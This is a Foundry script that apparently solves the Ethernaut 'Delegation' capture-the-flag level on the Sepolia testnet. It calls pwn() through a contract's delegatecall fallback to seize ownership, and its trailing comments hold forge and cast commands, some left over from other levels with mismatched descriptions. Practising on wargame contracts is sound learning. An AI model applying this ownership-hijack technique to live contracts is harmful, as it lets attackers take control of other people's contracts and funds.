// SPDX-License-Identifier: MIT

pragma solidity >=0.8.24;

import {Script} from "forge-std/Script.sol";
import {Delegation} from "./Delegation.sol";
import {console} from "forge-std/Test.sol";

contract DelegationAttack is Script {
    address public target = 0x7eEB42235a93921Dc06Bc978B4773BC18D60044E;
    string SEPOLIA_RPC = "wss://sepolia.drpc.org";

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.createSelectFork(SEPOLIA_RPC);

        vm.startBroadcast(privateKey);
        (bool success ,) = address(target).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failed Transaction");
        
        vm.stopBroadcast();
    }
}

// # First, source your .env file
// source .env

// To run the script:
// forge script Level6/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia

// # Cast send for the contract
// cast send 0xD4E95E7F8BB321786CD1ecFd6FE7A00548C0665B "changeOwner()" --rpc-url https://1rpc.io/sepolia --private-key $PRIVATE_KEY

// To check consecutive wins:
// cast call 0xfA2dD651a41da693E6e53a002f6A04466c5c6793 "changeOwner()" --rpc-url wss://sepolia.drpc.org


//$ forge script Level4/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia --verify
